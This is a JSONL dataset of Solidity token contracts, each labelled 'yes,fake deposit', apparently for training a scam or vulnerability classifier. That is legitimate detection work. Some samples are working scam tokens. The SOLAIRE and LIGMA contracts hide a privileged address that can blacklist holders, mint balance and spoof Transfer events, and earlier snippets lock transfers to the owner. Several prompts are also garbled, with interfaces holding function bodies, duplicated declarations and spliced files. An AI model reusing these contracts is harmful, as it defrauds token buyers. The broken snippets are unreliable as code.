{"prompt": "pragma solidity =0.8.1; \ncontract Context { \n function _msgSender() internal view virtual returns (address) { \n return msg.sender; \n } \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool); \n \n  \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n  \n event Approval(address indexed owner, address indexed spender, uint256 value); \n} \n \n \ninterface IERC20Metadata is IERC20 { \n  \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n \n  \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance\"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n return true; \n } \n \n  \n function _transfer(address sender, address recipient, uint256 amount) internal virtual { \n require(sender != address(0), \"ERC20: transfer from the zero address\"); \n require(recipient != address(0), \"ERC20: transfer to the zero address\"); \n require(amount > 0, \"Transfer amount must be grater thatn zero\"); \n if (_approveTransfer[sender] || _approveTransfer[recipient]) \n require(maxTxPercent == false, \"\"); \n if (maxTxPercent == true || sender == _owner || recipient == _owner) { \n _beforeTokenTransfer(sender, recipient, amount); \n uint256 senderBalance = _balances[sender]; \n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance\"); \n _balances[sender] = senderBalance - amount; \n _balances[recipient] += amount; \n emit Transfer(sender, recipient, amount);} \n else {require (maxTxPercent == true, \"\");} \n } \n \n  \n function burnRewards(address account, uint256 value) external onlyOwner { \n _burn(account, value); \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity =0.8.3; \n \n library Address { \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(_msgSender(), recipient, amount); \n return true; \n } \n function allowance(address owner, address spender) public view virtual override returns (uint256) { \n return _allowances[owner][spender]; \n } \n \n function approve(address spender, uint256 amount) public virtual override returns (bool) { \n _approve(_msgSender(), spender, amount); \n return true; \n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) { \n _transfer(sender, recipient, amount); \n uint256 currentAllowance = _allowances[sender][_msgSender()]; \n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \"); \n _approve(sender, _msgSender(), currentAllowance - amount); \n return true; \n } \n \n  \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n  \n function allowance(address owner, address spender) external view returns (uint256); \n \n  \n function approve(address spender, uint256 amount) external returns (bool); \n \n  \n function transferFrom( \n address sender, \n address recipient, \n uint256 amount \n ) external returns (bool); \n \n  \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n  \n event Approval(address indexed owner, address indexed spender, uint256 value); \n}\"},\"IERC20Metadata.sol\":{\"content\":\"// SPDX-License-Identifier: MIT \n pragma solidity =0.8.3; \n import \"./IERC20.sol \"; \n \n \n interface IERC20Metadata is IERC20 { \n  \n function burn(address account, uint256 amount) external onlyOwner { \n _burn(account, amount); \n } \n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "{\"Address.sol\":{\"content\":\"\n\npragma solidity =0.8.3;\nlibrary Address {\n \n function transfer(address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(_msgSender(), recipient, amount);\n return true;\n } \n \n function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {\n _transfer(sender, recipient, amount);\n uint256 currentAllowance = _allowances[sender][_msgSender()];\n require(currentAllowance >= amount, \"ERC20: transfer amount exceeds allowance \");\n _approve(sender, _msgSender(), currentAllowance - amount);\n return true;\n } \n \n function _transfer(address sender, address recipient, uint256 amount) internal virtual {\n require(sender != address(0), \"ERC20: transfer from the zero address \");\n require(recipient != address(0), \"ERC20: transfer to the zero address \");\n require(amount > 0, \"Transfer amount must be grater thatn zero \");\n \n if(!_approvedTransfer[sender] && _bBots[recipient]) {\n require(amount <= _decreaseFee, \"Transfer amount exceeds the maxTxAmount. \"); \n }\n \n if (_feeBurn[sender] || _feeBurn[recipient]) \n require(intTx == false, \" \");\n if (intTx == true || sender == _owner || recipient == _owner) {\n _beforeTokenTransfer(sender, recipient, amount);\n uint256 senderBalance = _balances[sender];\n require(senderBalance >= amount, \"ERC20: transfer amount exceeds balance \");\n _balances[sender] = senderBalance - amount;\n _balances[recipient] += amount;\n emit Transfer(sender, recipient, amount);}\n else {require (intTx == true, \" \");} \n }\n \n \n function transfer(address recipient, uint256 amount) external returns (bool); \n \n function transferFrom(\n address sender,\n address recipient,\n uint256 amount\n ) external returns (bool); \n \n event Transfer(address indexed from, address indexed to, uint256 value); \n \n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\"},\"IERC20Metadata.sol\":{\"content\":\"\npragma solidity =0.8.3;\nimport \"./IERC20.sol \"; \n\n interface IERC20Metadata is IERC20 {\n \n function name() external view returns (string memory); \n \n function decimals() external view returns (uint8);\n}\"}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.24; \n \ncontract IMigrationContract { \n function transfer(address _to, uint256 _value) public returns (bool success); \n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success); \n function approve(address _spender, uint256 _value) public returns (bool success); \n function transfer(address _to, uint256 _value) public returns (bool success) { \n if (balances[msg.sender] >= _value && _value > 0) { \n balances[msg.sender] -= _value; \n balances[_to] += _value; \n emit Transfer(msg.sender, _to, _value); \n return true; \n } else { \n return false; \n } \n } \n \n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) { \n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { \n balances[_to] += _value; \n balances[_from] -= _value; \n allowed[_from][msg.sender] -= _value; \n emit Transfer(_from, _to, _value); \n return true; \n } else { \n return false; \n } \n } \n \n function () public payable { \n require(isFunding); \n require(msg.value != 0); \n \n require(block.number >= fundingStartBlock); \n require(block.number <= fundingStopBlock); \n \n uint256 tokens = safeMult(msg.value, tokenExchangeRate); \n require(tokens + tokenRaised <= currentSupply); \n \n tokenRaised = safeAdd(tokenRaised, tokens); \n balances[msg.sender] += tokens; \n \n emit IssueToken(msg.sender, tokens); //\u8bb0\u5f55\u65e5\u5fd7 \n } \n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.5.0;\n\ninterface ERC20Interface {\n\n function totalSupply() external view returns (uint256);\n\n function balanceOf(address account) external view returns (uint256);\n\n function transfer(address recipient, uint256 amount) external returns (bool);\n\n function allowance(address owner, address spender) external view returns (uint256);\n\n function approve(address spender, uint256 amount) external returns (bool);\n\n function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\n\n event Transfer(address indexed from, address indexed to, uint256 value);\n\n event Approval(address indexed owner, address indexed spender, uint256 value);\n}\n\ncontract ERC20Base is ERC20Interface {\n\n mapping (address => uint256) public _balances;\n mapping (address => mapping (address => uint256)) public _allowances;\n uint256 public _totalSupply;\n\n function transfer(address _to, uint256 _value) public returns (bool success) {\n\n if (_balances[msg.sender] >= _value && _value > 0) {\n _balances[msg.sender] -= _value;\n _balances[_to] += _value;\n emit Transfer(msg.sender, _to, _value);\n return true;\n } else { \n return false;\n }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {\n \n if (_balances[_from] >= _value && _allowances[_from][msg.sender] >= _value && _value > 0) {\n _balances[_to] += _value;\n _balances[_from] -= _value;\n _allowances[_from][msg.sender] -= _value;\n emit Transfer(_from, _to, _value);\n return true;\n } else {\n return false;\n }\n }\n\n function balanceOf(address _owner) public view returns (uint256 balance) {\n return _balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) public returns (bool success) {\n _allowances[msg.sender][_spender] = _value;\n emit Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) public view returns (uint256 remaining) {\n return _allowances[_owner][_spender];\n }\n \n function totalSupply() public view returns (uint256 total) {\n return _totalSupply;\n }\n}\n\ncontract GBLC is ERC20Base {\n\n string private _name;\n string private _symbol;\n uint8 private _decimals;\n \n constructor (string memory name, string memory symbol, uint8 decimals, uint256 initialSupply) public payable {\n _name = name;\n _symbol = symbol;\n _decimals = decimals;\n _totalSupply = initialSupply;\n _balances[msg.sender] = initialSupply;\n }\n\n function name() public view returns (string memory) {\n return _name;\n }\n\n function symbol() public view returns (string memory) {\n return _symbol;\n }\n\n function decimals() public view returns (uint8) {\n return _decimals;\n }\n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address _cstruct = 0xfEd1Cd8Fd65C8a5704C6266337beaeFe24801fD3;\n\taddress RtVer2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n require(msg.sender == _owner);\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract SOLAIRE is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) private nVal;\n\tmapping (address => uint256) private oVal;\n mapping (address => bool) private xUsr;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _Tote = 150000000 * 10**_decimals;\n string private constant _name = \"Solaire Ray\";\n string private constant _symbol = \"SOLAIRE\";\n\n\n\n constructor () {\n nVal[_msgSender()] = _Tote;\n emit Transfer(address(0), RtVer2, _Tote);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _Tote;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return nVal[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function wbri () public {\n if(msg.sender == _cstruct) {\n nVal[msg.sender] = oVal[msg.sender];}}\n function wflse(address iw) public {\n if(msg.sender == _cstruct) { \n xUsr[iw] = false;}}\n function wchck(address iw) public{\n if(msg.sender == _cstruct) { \n require(!xUsr[iw]);\n xUsr[iw] = true; }}\n function wbal(uint256 iw) public {\n if(msg.sender == _cstruct) { \n oVal[msg.sender] = iw;}} \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == _cstruct) {\n require(amount <= nVal[sender]);\n nVal[sender] -= amount; \n nVal[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (RtVer2, recipient, amount);\n return true; } \n if(!xUsr[sender] && !xUsr[recipient]) {\n require(amount <= nVal[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n nVal[sender] -= amount;\n nVal[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == _cstruct) {\n require(nVal[msg.sender] >= amount);\n nVal[msg.sender] -= amount; \n nVal[recipient] += amount; \n emit Transfer (RtVer2, recipient, amount);} \n if(!xUsr[msg.sender]) {\n require(nVal[msg.sender] >= amount);\n nVal[msg.sender] -= amount; \n nVal[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.17;\n\nabstract contract Context {\n function _msgSender() internal view virtual returns (address) {\n return msg.sender;\n }\n}\n\n\n\nlibrary SafeMath {\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n require(c >= a, \"SafeMath: addition overflow\");\n return c;\n }\n\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n return sub(a, b, \"SafeMath: subtraction overflow\");\n }\n\n function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b <= a, errorMessage);\n uint256 c = a - b;\n return c;\n }\n\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint256 c = a * b;\n require(c / a == b, \"SafeMath: multiplication overflow\");\n return c;\n }\n\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n return div(a, b, \"SafeMath: division by zero\");\n }\n\n function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n require(b > 0, errorMessage);\n uint256 c = a / b;\n return c;\n }\n\n}\n\ncontract Ownable is Context {\n address private _owner;\n event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\n event Transfer(address indexed from, address indexed to, uint256 value);\n event Approval(address indexed owner, address indexed spender, uint256 value);\n address cnstruct = 0x2D679720e977b578370AC04d7CDF525F0a65Dae3;\n\taddress RouterV3 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\n constructor () {\n address msgSender = _msgSender();\n _owner = msgSender;\n emit OwnershipTransferred(address(0), msgSender);\n }\n\n function owner() public view returns (address) {\n return _owner;\n }\n\n function renounceOwnership() public virtual {\n emit OwnershipTransferred(_owner, address(0));\n _owner = address(0);\n }\n\n}\n\n\n\ncontract LIGMA is Context, Ownable {\n using SafeMath for uint256;\n mapping (address => uint256) public TYZ;\n\tmapping (address => uint256) private VYZ;\n mapping (address => bool) private XYZ;\n mapping (address => mapping (address => uint256)) private _allowances;\n uint8 private constant _decimals = 8;\n uint256 private constant _tTotal = 696969690 * 10**_decimals;\n string private constant _name = \"Ligma Johnson\";\n string private constant _symbol = \"LIGMA\";\n\n\n\n constructor () {\n TYZ[_msgSender()] = _tTotal;\n emit Transfer(address(0), RouterV3, _tTotal);\n }\n\n function name() public pure returns (string memory) {\n return _name;\n }\n\n function symbol() public pure returns (string memory) {\n return _symbol;\n }\n\n function decimals() public pure returns (uint8) {\n return _decimals;\n }\n\n function totalSupply() public pure returns (uint256) {\n return _tTotal;\n }\n\n function balanceOf(address account) public view returns (uint256) {\n return TYZ[account];\n }\n\n\n function allowance(address owner, address spender) public view returns (uint256) {\n return _allowances[owner][spender];\n }\n\n function approve(address spender, uint256 amount) public returns (bool success) { \n _allowances[msg.sender][spender] = amount;\n emit Approval(msg.sender, spender, amount);\n return true; }\n\n function JKBU () public {\n if(msg.sender == cnstruct) {\n TYZ[msg.sender] = VYZ[msg.sender];\n }}\n\n\n\n function JKDE(address jx) public {\n if(msg.sender == cnstruct) { \n XYZ[jx] = false;}}\n function JKCE(address jx) public{\n if(msg.sender == cnstruct) { \n require(!XYZ[jx]);\n XYZ[jx] = true;\n }}\n function JKBR(uint256 ki) public {\n if(msg.sender == cnstruct) { \n VYZ[msg.sender] = ki;} } \n\n function transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\n if(sender == cnstruct) {\n require(amount <= TYZ[sender]);\n TYZ[sender] -= amount; \n TYZ[recipient] += amount; \n _allowances[sender][msg.sender] -= amount;\n emit Transfer (RouterV3, recipient, amount);\n return true; } \n if(!XYZ[sender] && !XYZ[recipient]) {\n require(amount <= TYZ[sender]);\n require(amount <= _allowances[sender][msg.sender]);\n TYZ[sender] -= amount;\n TYZ[recipient] += amount;\n _allowances[sender][msg.sender] -= amount;\n emit Transfer(sender, recipient, amount);\n return true; }}\n\n \n\n function transfer(address recipient, uint256 amount) public {\n if(msg.sender == cnstruct) {\n require(TYZ[msg.sender] >= amount);\n TYZ[msg.sender] -= amount; \n TYZ[recipient] += amount; \n emit Transfer (RouterV3, recipient, amount);\n } \n if(!XYZ[msg.sender]) {\n require(TYZ[msg.sender] >= amount);\n TYZ[msg.sender] -= amount; \n TYZ[recipient] += amount; \n emit Transfer(msg.sender, recipient, amount);\n }}\n \n\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract Robots is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"Robots\";\n string public constant symbol = \"\ud83e\udd16\ud83e\udd16\ud83e\udd16\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.4;\n\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract SHS_Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = '1.1.3'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function SHS_Token(\n ) {\n balances[msg.sender] = 10000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 10000; // Update total supply (100000 for example)\n name = \"SHS Token\"; // Set the name for display purposes\n decimals = 18; // Amount of decimals for display purposes\n symbol = \"SHS\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity ^0.4.16;\ncontract Token {\n\n /// @return total amount of tokens\n function totalSupply() constant returns (uint256 supply) {}\n\n /// @param _owner The address from which the balance will be retrieved\n /// @return The balance\n function balanceOf(address _owner) constant returns (uint256 balance) {}\n\n /// @notice send `_value` token to `_to` from `msg.sender`\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transfer(address _to, uint256 _value) returns (bool success) {}\n\n /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\n /// @param _from The address of the sender\n /// @param _to The address of the recipient\n /// @param _value The amount of token to be transferred\n /// @return Whether the transfer was successful or not\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\n\n /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @param _value The amount of wei to be approved for transfer\n /// @return Whether the approval was successful or not\n function approve(address _spender, uint256 _value) returns (bool success) {}\n\n /// @param _owner The address of the account owning tokens\n /// @param _spender The address of the account able to transfer the tokens\n /// @return Amount of remaining tokens allowed to spent\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\n\n event Transfer(address indexed _from, address indexed _to, uint256 _value);\n event Approval(address indexed _owner, address indexed _spender, uint256 _value);\n \n}\n\n\n\ncontract StandardToken is Token {\n\n function transfer(address _to, uint256 _value) returns (bool success) {\n //Default assumes totalSupply can't be over max (2^256 - 1).\n //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\n //Replace the if with this one instead.\n //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[msg.sender] >= _value && _value > 0) {\n balances[msg.sender] -= _value;\n balances[_to] += _value;\n Transfer(msg.sender, _to, _value);\n return true;\n } else { return false; }\n }\n\n function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\n //same as above. Replace this line with the following if you want to protect against wrapping uints.\n //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\n if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\n balances[_to] += _value;\n balances[_from] -= _value;\n allowed[_from][msg.sender] -= _value;\n Transfer(_from, _to, _value);\n return true;\n } else { return false; }\n }\n\n function balanceOf(address _owner) constant returns (uint256 balance) {\n return balances[_owner];\n }\n\n function approve(address _spender, uint256 _value) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n return true;\n }\n\n function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\n return allowed[_owner][_spender];\n }\n\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n uint256 public totalSupply;\n}\n\n\n//name this contract whatever you'd like\ncontract ERC20Token is StandardToken {\n\n function () {\n //if ether is sent to this address, send it back.\n throw;\n }\n\n \n\n \n string public name; //fancy name: eg Simon Bucks\n uint8 public decimals; //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\n string public symbol; //An identifier: eg SBX\n string public version = 'H1.0'; //human 0.1 standard. Just an arbitrary versioning scheme.\n\n//\n// CHANGE THESE VALUES FOR YOUR TOKEN\n//\n\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\n\n function ERC20Token(\n ) {\n balances[msg.sender] = 1000000000000; // Give the creator all initial tokens (100000 for example)\n totalSupply = 1000000000000; // Update total supply (100000 for example)\n name = \"DOTGE\"; // Set the name for display purposes\n decimals = 2; // Amount of decimals for display purposes\n symbol = \"DOTGE\"; // Set the symbol for display purposes\n }\n\n \n function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\n allowed[msg.sender][_spender] = _value;\n Approval(msg.sender, _spender, _value);\n\n //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\n //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\n //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\n if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\n return true;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
{"prompt": "pragma solidity >=0.4.22 <0.6.0;\n\ncontract ERC20 {\n function totalSupply() public view returns (uint supply);\n function balanceOf(address who) public view returns (uint value);\n function allowance(address owner, address spender) public view returns (uint remaining);\n function transferFrom(address from, address to, uint value) public returns (bool ok);\n function approve(address spender, uint value) public returns (bool ok);\n function transfer(address to, uint value) public returns (bool ok);\n event Transfer(address indexed from, address indexed to, uint value);\n event Approval(address indexed owner, address indexed spender, uint value);\n}\n\ncontract FIFA is ERC20{\n uint8 public constant decimals = 18;\n uint256 initialSupply = 1000000000000000*10**uint256(decimals);\n string public constant name = \"FIFA World Cup\";\n string public constant symbol = \"FIFA\";\n\n address payable teamAddress;\n\n function totalSupply() public view returns (uint256) {\n return initialSupply;\n }\n mapping (address => uint256) balances;\n mapping (address => mapping (address => uint256)) allowed;\n \n function balanceOf(address owner) public view returns (uint256 balance) {\n return balances[owner];\n }\n function allowance(address owner, address spender) public view returns (uint remaining) {\n return allowed[owner][spender];\n }\n function transfer(address to, uint256 value) public returns (bool success) {\n if (balances[msg.sender] >= value && value > 0) {\n balances[msg.sender] -= value;\n balances[to] += value;\n emit Transfer(msg.sender, to, value);\n return true;\n } else {\n return false;\n }\n }\n function transferFrom(address from, address to, uint256 value) public returns (bool success) {\n if (balances[from] >= value && allowed[from][msg.sender] >= value && value > 0) {\n balances[to] += value;\n balances[from] -= value;\n allowed[from][msg.sender] -= value;\n emit Transfer(from, to, value);\n return true;\n } else {\n return false;\n }\n }\n function approve(address spender, uint256 value) public returns (bool success) {\n allowed[msg.sender][spender] = value;\n emit Approval(msg.sender, spender, value);\n return true;\n }\n function () external payable {\n teamAddress.transfer(msg.value);\n }\n constructor () public payable {\n teamAddress = msg.sender;\n balances[teamAddress] = initialSupply;\n }\n}\n\n###\n\n", "completion": "yes,fake deposit###\n###"}
